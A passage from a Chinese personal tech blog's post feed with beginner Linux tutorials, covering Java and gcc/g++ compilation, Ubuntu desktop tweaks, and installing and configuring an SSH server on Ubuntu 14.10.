<p>在文件中添加<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JAVA_HOME=&quot;/usr/lib/jvm/java-8-oracle&quot;</span><br></pre></td></tr></table></figure></p>
<p>保存退出，输入下面的命令使修改生效<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">:wq</span><br><span class="line">source /etc/environment</span><br></pre></td></tr></table></figure></p>
<p>测试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo $JAVA_HOME</span><br></pre></td></tr></table></figure></p>
<p>若显示刚才添加的路径则说明配置成功。</p>
<h2><span id="简单编译运行">简单编译运行</span></h2><h3><span id="示例程序">示例程序</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public class test &#123;</span><br><span class="line"></span><br><span class="line">   /*</span><br><span class="line">    * 输出一行字符串“Hello World!”</span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line"></span><br><span class="line">    System.out.println(&quot;Hello World!&quot;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3><span id="命令">命令</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac test.java</span><br><span class="line">java test</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20170312124230.jpg" alt=""></p>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Ubuntu 16.10下gcc/g++编译器使用简介]]></title>
      <url>https://uknowsec.cn/posts/linux/%E7%AC%AC%E4%B8%89%E5%91%A8-Ubuntu-16-10%E4%B8%8Bgcc-g-%E7%BC%96%E8%AF%91%E5%99%A8%E4%BD%BF%E7%94%A8%E7%AE%80%E4%BB%8B.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h1><span id="gcc">GCC</span></h1><h2><span id="简介">简介</span></h2><p>GCC（GNU Compiler Collection，GNU编译器套装），是一套由 GNU 开发的编程语言编译器。它是一套以 GPL 及 LGPL 许可证所发行的自由软件，也是 GNU计划 的关键部分，亦是自由的 类Unix 及苹果计算机 Mac OS X 操作系统的标准编译器。GCC（特别是其中的C语言编译器）也常被认为是跨平台编译器的事实标准。</p>
<h2><span id="简单编译">简单编译</span></h2><h3><span id="示例程序">示例程序</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	printf(&quot;hello world!\n&quot;);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个程序，一步到位的编译指令是:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc test.c -o test</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20170312114049.jpg" alt=""></p>
<p>实质上，上述编译过程是分为四个阶段进行的，即预处理(也称预编译，Preprocessing)、编译(Compilation)、汇编 (Assembly)和连接(Linking)。</p>
<h3><span id="预编译">预编译</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -E test.c -o test.i</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE2017031211404.jpg" alt=""></p>
<p>可以输出test.i文件中存放着test.c经预处理之后的代码。打开test.i文件，看一看，就明白了。后面那条指令，是直接在命令行窗口中输出预处理后的代码.<br>gcc的-E选项，可以让编译器在预处理后停止，并输出预处理结果。在本例中，预处理结果就是将stdio.h 文件中的内容插入到test.c中了。</p>
<h3><span id="编译">编译</span></h3><p>预处理之后，可直接对生成的test.i文件编译，生成汇编代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -S test.i -o test.s</span><br></pre></td></tr></table></figure></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20170312114625.jpg" alt=""><br>gcc的-S选项，表示在程序编译期间，在生成汇编代码后，停止，-o输出汇编代码文件。</p>
<h3><span id="汇编">汇编</span></h3><p>对于上一小节中生成的汇编代码文件test.s，gas汇编器负责将其编译为目标文件，如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -c test.s -o test.o</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20170312114751.jpg" alt=""></p>
<h3><span id="连接">连接</span></h3><p>gcc连接器是gas提供的，负责将程序的目标文件与所需的所有附加的目标文件连接起来，最终生成可执行文件。附加的目标文件包括静态连接库和动态连接库。<br>对于上一小节中生成的test.o，将其与Ｃ标准输入输出库进行连接，最终生成程序test<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc test.o -o test</span><br></pre></td></tr></table></figure></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20170312114928.jpg" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./test      //执行程序test</span><br></pre></td></tr></table></figure>
<h1><span id="g">G++</span></h1><h2><span id="编译流程">编译流程</span></h2><h3><span id="预处理-pre-processing">预处理-Pre-Processing</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g++  -E  test.cpp  -o  test.i</span><br></pre></td></tr></table></figure>
<h3><span id="编译-compiling">编译-Compiling</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g++  -S  test.i  -o   test.s</span><br></pre></td></tr></table></figure>
<h3><span id="汇编-assembling">汇编-Assembling</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g++  -c  test.s  -o  test.o</span><br></pre></td></tr></table></figure>
<h3><span id="链接-linking">链接-Linking</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g++  test.o  -o  test</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Ubuntu 16.10日常折腾二三事]]></title>
      <url>https://uknowsec.cn/posts/linux/%E7%AC%AC%E4%B8%89%E5%91%A8-Ubuntu-16-10%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE%E4%BA%8C%E4%B8%89%E4%BA%8B.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h2><span id="前言">前言</span></h2><p>之前我是装的Ubuntu 14.10的，后来…后来可能是喜欢折腾。把Ubuntu 14.10卸载了，装了最新版的Ubuntu 16.10版本，装完之后还是折腾那几件事。</p>
<h2><span id="正文">正文</span></h2><h3><span id="搜狗输入法">搜狗输入法</span></h3><p>输入法的安装还是跟Ubuntu 14.10是一样的，但是重启后fcitx不能启动，以致于无法使用搜狗输入法。
　</p>
<h4><span id="安装">安装：</span></h4><p>当前最新版本是sogoupinyin_2.1.0.0082_amd64.deb<a href="http://cdn2.ime.sogou.com/dl/index/1475147394/sogoupinyin_2.1.0.0082_amd64.deb?st=UvO7xZ1Rvw-j5J5UW6D0ZQ&amp;e=1487927618&amp;fn=sogoupinyin_2.1.0.0082_amd64.deb" target="_blank" rel="noopener">下载链接</a><br>可以直接双击安装，也可以在安装包目录下打开终端，执行命令。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg -i sogoupinyin_2.1.0.0082_amd64.deb</span><br></pre></td></tr></table></figure>
<h4><span id="fcitx自启动">fcitx自启动</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~    //切换到用户主目录下面</span><br><span class="line">sudo vim .xprofile    //创建并编辑.xprofile</span><br></pre></td></tr></table></figure>
<p>拷贝内容至.xprofile<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">export LC_ALL=zh_CN.utf8</span><br><span class="line">export XMODIFIERS=@im=fcitx</span><br><span class="line">export QT_IM_MODULE=xim</span><br><span class="line">export GTK_IM_MODULE=xim</span><br><span class="line">fcitx -d</span><br><span class="line">:wq				//保存退出</span><br><span class="line">reboot			//重启</span><br></pre></td></tr></table></figure></p>
<h3><span id="删除自带软件">删除自带软件</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get autoremove --purge thunderbird totem rhythmbox empathy brasero simple-scan gnome-mahjongg aisleriot gnome-mines cheese transmission-common gnome-orca webbrowser-app gnome-sudoku  landscape-client-ui-install</span><br></pre></td></tr></table></figure>
<h3><span id="删除amazon的链接">删除Amazon的链接</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get autoremove --purge unity-webapps-common</span><br></pre></td></tr></table></figure>
<h3><span id="启动器移动">启动器移动</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install flashplugin-installer</span><br><span class="line">gsettings set com.canonical.Unity.Launcher launcher-position Bottom（Bottom改为Left可重新移动到左侧，输入Right无效）</span><br></pre></td></tr></table></figure>
<h3><span id="卸载libreoffice">卸载LibreOffice</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get purge libreoffice*</span><br><span class="line">sudo apt-get autoremove</span><br></pre></td></tr></table></figure>
<h3><span id="修改主题">修改主题</span></h3><p>我一直想安装的Flatabulous主题的，但是好像有点问题安装后，后来找了相似扁平化的主题Paper</p>
<h4><span id="安装-unity-tweak-tool">安装 unity-tweak-tool</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install unity-tweak-tool</span><br></pre></td></tr></table></figure>
<h4><span id="安装主题包">安装主题包</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:snwh/pulp</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install paper-gtk-theme paper-icon-theme</span><br></pre></td></tr></table></figure>
<p>搜索你的计算机–&gt;unity-tweak-tool–&gt;外观–&gt;主题<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20170312104441.jpg" alt=""><br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20170312104456.jpg" alt=""></p>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Ubuntu 14.10远程登录服务器--ssh的安装和配置]]></title>
      <url>https://uknowsec.cn/posts/linux/%E7%AC%AC%E4%B8%80%E5%91%A8-Ubuntu-14-10%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95%E6%9C%8D%E5%8A%A1%E5%99%A8-ssh%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h2><span id="前言">前言</span></h2><p>ssh是一种安全协议，主要用于给远程登录会话数据进行加密，保证数据传输的安全，现在在需怒江Ubuntu 14.04环境下安装和配置ssh。</p>
<h2><span id="正文">正文</span></h2><h3><span id="更新源列表">更新源列表</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E5%9B%BE%E7%89%8720170224181454.png" alt=""></p>
<h3><span id="安装ssh">安装ssh</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install openssh-server</span><br></pre></td></tr></table></figure>
<p>执行命令出现如下情况，按照提示貌似需要安装openshh-client和ssh-import-id<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20170224182359.jpg" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install openshh-client</span><br><span class="line">sudo apt-get install ssh-import-id</span><br></pre></td></tr></table></figure>
<p>安装完openshh-client和ssh-import-id后还是显示错误</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20170224183037.jpg" alt=""></p>
<p>然后得知Ubuntu自带的openssh-clien与所要安装的openssh-server所依赖的版本不同,这里所依赖的版本是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1:6.6p1-2ubuntu2.8</span><br></pre></td></tr></table></figure></p>
<p>所以要安装降级安装低版本的openssh-clien，来覆盖Ubuntu自带的openssh-clien版本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install openssh-client=1:6.6p1-2ubuntu1</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">uknow@uknow-ubuntu:~$ sudo apt-get install openssh-client=1:6.6p1-2ubuntu1</span><br><span class="line">正在读取软件包列表... 完成</span><br><span class="line">正在分析软件包的依赖关系树       </span><br><span class="line">正在读取状态信息... 完成       </span><br><span class="line">下列软件包是自动安装的并且现在不需要了：</span><br><span class="line">  apparmor-easyprof apparmor-easyprof-ubuntu click click-apparmor</span><br><span class="line">  gir1.2-click-0.4 gir1.2-gee-0.8 libclick-0.4-0 libcolord1</span><br><span class="line">  libgnome-desktop-3-7 libgtop2-7 liblttng-ust-ctl2 liblttng-ust0</span><br><span class="line">  libupstart-app-launch2 liburcu1 python3-apparmor python3-apparmor-click</span><br><span class="line">  python3-click python3-libapparmor upstart-app-launch</span><br><span class="line">  upstart-app-launch-tools</span><br><span class="line">Use &apos;apt-get autoremove&apos; to remove them.</span><br><span class="line">建议安装的软件包：</span><br><span class="line">  libpam-ssh keychain monkeysphere</span><br><span class="line">下列软件包将被【降级】：</span><br><span class="line">  openssh-client</span><br><span class="line">升级了 0 个软件包，新安装了 0 个软件包，降级了 1 个软件包，要卸载 0 个软件包，有 7 个软件包未被升级。</span><br><span class="line">需要下载 566 kB 的软件包。</span><br><span class="line">解压缩后将会空出 54.3 kB 的空间。</span><br><span class="line">您希望继续执行吗？ [Y/n] </span><br><span class="line">获取：1 http://ftp.cuhk.edu.hk/pub/Linux/ubuntu/ trusty/main openssh-client amd64 1:6.6p1-2ubuntu1 [566 kB]</span><br><span class="line">下载 566 kB，耗时 1秒 (419 kB/s)        </span><br><span class="line">dpkg：警告：downgrading openssh-client from 1:6.6p1-8 to 1:6.6p1-2ubuntu1</span><br><span class="line">(正在读取数据库 ... 系统当前共安装有 171295 个文件和目录。)</span><br><span class="line">Preparing to unpack .../openssh-client_1%3a6.6p1-2ubuntu1_amd64.deb ...</span><br><span class="line">Unpacking openssh-client (1:6.6p1-2ubuntu1) over (1:6.6p1-8) ...</span><br><span class="line">Processing triggers for man-db (2.7.0.2-2) ...</span><br></pre></td></tr></table></figure>
<p>可以看到,提示了系统中openssh-client被降级</p>
<p>再安装openssh-server就可以成功了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo  apt-get install openssh-server</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">uknow@uknow-ubuntu:~$ sudo  apt-get install openssh-server</span><br><span class="line">正在读取软件包列表... 完成</span><br><span class="line">正在分析软件包的依赖关系树       </span><br><span class="line">正在读取状态信息... 完成       </span><br><span class="line">下列软件包是自动安装的并且现在不需要了：</span><br><span class="line">  apparmor-easyprof apparmor-easyprof-ubuntu click click-apparmor</span><br><span class="line">  gir1.2-click-0.4 gir1.2-gee-0.8 libclick-0.4-0 libcolord1</span><br><span class="line">  libgnome-desktop-3-7 libgtop2-7 liblttng-ust-ctl2 liblttng-ust0</span><br><span class="line">  libupstart-app-launch2 liburcu1 python3-apparmor python3-apparmor-click</span><br><span class="line">  python3-click python3-libapparmor upstart-app-launch</span><br><span class="line">  upstart-app-launch-tools</span><br><span class="line">Use &apos;apt-get autoremove&apos; to remove them.</span><br><span class="line">将会安装下列额外的软件包：</span><br><span class="line">  libck-connector0 ncurses-term openssh-client openssh-sftp-server</span><br><span class="line">建议安装的软件包：</span><br><span class="line">  libpam-ssh keychain monkeysphere rssh molly-guard</span><br><span class="line">下列【新】软件包将被安装：</span><br><span class="line">  libck-connector0 ncurses-term openssh-server openssh-sftp-server</span><br><span class="line">下列软件包将被升级：</span><br><span class="line">  openssh-client</span><br><span class="line">升级了 1 个软件包，新安装了 4 个软件包，要卸载 0 个软件包，有 7 个软件包未被升级。</span><br><span class="line">需要下载 1,173 kB 的软件包。</span><br><span class="line">解压缩后会消耗掉 3,344 kB 的额外空间。</span><br><span class="line">您希望继续执行吗？ [Y/n] </span><br><span class="line">获取：1 http://ftp.cuhk.edu.hk/pub/Linux/ubuntu/ trusty/main libck-connector0 amd64 0.4.5-3.1ubuntu2 [10.5 kB]</span><br><span class="line">获取：2 http://ftp.cuhk.edu.hk/pub/Linux/ubuntu/ trusty-security/main openssh-client amd64 1:6.6p1-2ubuntu2.8 [564 kB]</span><br><span class="line">获取：3 http://ftp.cuhk.edu.hk/pub/Linux/ubuntu/ trusty/main ncurses-term all 5.9+20140118-1ubuntu1 [243 kB]</span><br><span class="line">获取：4 http://ftp.cuhk.edu.hk/pub/Linux/ubuntu/ trusty-security/main openssh-sftp-server amd64 1:6.6p1-2ubuntu2.8 [34.2 kB]</span><br><span class="line">获取：5 http://ftp.cuhk.edu.hk/pub/Linux/ubuntu/ trusty-security/main openssh-server amd64 1:6.6p1-2ubuntu2.8 [322 kB]</span><br><span class="line">下载 1,173 kB，耗时 2秒 (470 kB/s)      </span><br><span class="line">正在预设定软件包 ...</span><br><span class="line">Selecting previously unselected package libck-connector0:amd64.</span><br><span class="line">(正在读取数据库 ... 系统当前共安装有 171295 个文件和目录。)</span><br><span class="line">Preparing to unpack .../libck-connector0_0.4.5-3.1ubuntu2_amd64.deb ...</span><br><span class="line">Unpacking libck-connector0:amd64 (0.4.5-3.1ubuntu2) ...</span><br><span class="line">Preparing to unpack .../openssh-client_1%3a6.6p1-2ubuntu2.8_amd64.deb ...</span><br><span class="line">Unpacking openssh-client (1:6.6p1-2ubuntu2.8) over (1:6.6p1-2ubuntu1) ...</span><br><span class="line">Selecting previously unselected package ncurses-term.</span><br><span class="line">Preparing to unpack .../ncurses-term_5.9+20140118-1ubuntu1_all.deb ...</span><br><span class="line">Unpacking ncurses-term (5.9+20140118-1ubuntu1) ...</span><br><span class="line">Selecting previously unselected package openssh-sftp-server.</span><br><span class="line">Preparing to unpack .../openssh-sftp-server_1%3a6.6p1-2ubuntu2.8_amd64.deb ...</span><br><span class="line">Unpacking openssh-sftp-server (1:6.6p1-2ubuntu2.8) ...</span><br><span class="line">Selecting previously unselected package openssh-server.</span><br><span class="line">Preparing to unpack .../openssh-server_1%3a6.6p1-2ubuntu2.8_amd64.deb ...</span><br><span class="line">Unpacking openssh-server (1:6.6p1-2ubuntu2.8) ...</span><br><span class="line">Processing triggers for man-db (2.7.0.2-2) ...</span><br><span class="line">Processing triggers for ufw (0.34~rc-0ubuntu4) ...</span><br><span class="line">Processing triggers for ureadahead (0.100.0-16) ...</span><br><span class="line">ureadahead will be reprofiled on next reboot</span><br><span class="line">正在设置 libck-connector0:amd64 (0.4.5-3.1ubuntu2) ...</span><br><span class="line">正在设置 openssh-client (1:6.6p1-2ubuntu2.8) ...</span><br><span class="line">正在设置 ncurses-term (5.9+20140118-1ubuntu1) ...</span><br><span class="line">正在设置 openssh-sftp-server (1:6.6p1-2ubuntu2.8) ...</span><br><span class="line">正在设置 openssh-server (1:6.6p1-2ubuntu2.8) ...</span><br><span class="line">Creating SSH2 RSA key; this may take some time ...</span><br><span class="line">Creating SSH2 DSA key; this may take some time ...</span><br><span class="line">Creating SSH2 ECDSA key; this may take some time ...</span><br><span class="line">Creating SSH2 ED25519 key; this may take some time ...</span><br><span class="line">ssh start/running, process 7136</span><br><span class="line">Processing triggers for libc-bin (2.19-10ubuntu2) ...</span><br><span class="line">Processing triggers for ufw (0.34~rc-0ubuntu4) ...</span><br><span class="line">Processing triggers for ureadahead (0.100.0-16) ...</span><br></pre></td></tr></table></figure>
<h3><span id="ssh服务">ssh服务</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo ps -e |grep ssh       //查看ssh服务是否启动</span><br><span class="line">sudo service ssh start     //开启ssh服务</span><br><span class="line">sudo service ssh stop		//关闭ssh服务</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20170224183549.jpg" alt=""></p>
<h3><span id="修改配置文件sshd_config">修改配置文件sshd_config</span></h3><ul>
<li><p>使用gedit修改配置文件”/etc/ssh/sshd_config”</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure>
</li>
<li><p>将其中的PermitRootLogin改为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PermitRootLogin yes</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E5%9B%BE%E7%89%8720170224190101.png" alt=""></p>
<h3><span id="利用xshell连接">利用Xshell连接</span></h3><ul>
<li>查看本机ip<br>注意物理机和虚拟机网络方式需要使用桥接模式<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20170224190652.jpg" alt=""></p>
<ul>
<li><p>使用Xshell登录ubuntu<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20170224190730.jpg" alt=""><br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20170224190741.jpg" alt=""><br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20170224190801.jpg" alt=""></p>
</li>
<li><p>xshell上利用ifconfig<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20170224190844.jpg" alt=""></p>
</li>
</ul>
<p>至此，成功的配置好了ssh并成功利用Xshel连接。</p>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Ubuntu 14.10安装后的二三事]]></title>
      <url>https://uknowsec.cn/posts/linux/%E7%AC%AC%E4%B8%80%E5%91%A8-Ubuntu-14-10%E5%AE%89%E8%A3%85%E5%90%8E%E7%9A%84%E4%BA%8C%E4%B8%89%E4%BA%8B.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h2><span id="前言">前言</span></h2><p>上课老师用到的是VMware+Ubuntu 14.10，而我用到的是VirtualBox+Ubuntu 14.10。之前我也是用VMware，但是之后就用VirtualBox了。因为VirtualBox开源，而且相较于VMware轻便很多，所占内存小。在VirtualBox下安装完Ubuntu 14.10后在几个问题上折腾了半天，特写一篇博客记下这个过程。</p>
<h2><span id="正文">正文</span></h2><h3><span id="vmware-tools安装">VMware tools安装</span></h3><p>由于我自己用的是VirtualBox，所以用同学的电脑演示一下安装VMware tools。<br>直接贴gif地址吧，博客上上传不了gif图片。<br><a href="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xx.gif" target="_blank" rel="noopener">GIF图片传送门</a></p>
<p>GIF图片最后一步<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./vmware-install.pl</span><br></pre></td></tr></table></figure></p>
<p>执行命令后，会要你输入yes or no ，出现的第一个no,手动键入yes。<br>后面的直接回车就好了，然后重启。<br>就可以物理机和虚拟机双向复制粘贴文本和文件了。<br>虚拟机分辨率问题可以在系统设置里面，设置显示选项，选择合适物理机的分辨率。</p>
<h3><span id="nat-模式">NAT 模式</span></h3><p>按照老师给出的安装文档，上面是让我们设置桥接模式的，但是由于校园网的原因，桥接模式是不能联网的。所以需要修改虚拟机网络设置。<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E5%9B%BE%E7%89%8720170226120725.png" alt=""><br>注销或重启计算机即可。</p>
<h3><span id="ubuntu-1410更新源">Ubuntu 14.10更新源</span></h3><p>记得我之前用kali linux的时候，每次装完系统或者挂起kali虚拟机的时候都习惯的更新软件和内核什么的，所以Ubuntu 14.10也是如此。由于中国防火墙的问题，如果用Ubuntu官方源进行更新是很痛苦的事情。所以在网上寻找国内的更新源是不错的选择。</p>
<ul>
<li><p>首先备份源列表:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cp /etc/apt/sources.list /etc/apt/sources.list_backup</span><br></pre></td></tr></table></figure>
</li>
